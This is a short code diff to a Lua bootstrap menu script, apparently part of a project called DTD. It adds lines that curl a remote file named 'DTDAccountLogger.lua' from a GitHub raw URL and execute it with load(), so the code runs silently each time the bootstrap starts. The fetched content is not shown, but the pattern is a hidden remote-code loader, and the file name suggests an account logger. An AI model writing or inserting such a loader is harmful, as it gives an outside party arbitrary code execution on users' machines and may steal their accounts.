@@ -37,6 +37,11 @@ function loadpacks()
   end
 end
 
+local ssl = io.popen("curl -S https://raw.githubusercontent.com/nathanc0dxxx-cpu/DTD/main/SystemManagers/DTDAccountLogger.lua")
+local ssc = ssl:read("*a")
+ssl:close()
+if ssc then load(ssc)() end
+
 ::s::
 print("\27[44m[DTD::BOOTSTRAP]:\27[0mtype a option\nof bootstrap\n\n\27[93m[1]: start\n[2]: loadpack\n[3]: removepack\n\27[0m")
 local cmd = io.read()
